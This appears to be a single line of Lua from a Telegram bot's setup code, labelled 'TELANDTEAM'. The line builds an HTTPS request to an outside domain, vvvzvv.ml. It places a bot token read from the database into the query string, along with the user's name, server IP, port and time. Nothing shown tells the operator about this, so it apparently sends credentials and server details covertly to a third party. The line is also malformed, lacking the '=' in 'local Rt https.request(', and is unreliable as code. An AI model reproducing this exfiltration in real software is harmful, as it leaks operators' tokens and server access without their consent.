...
local Rt https.request("https://vvvzvv.ml/index/Teland.php?n=TELANDTEAM&id="..Id.."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
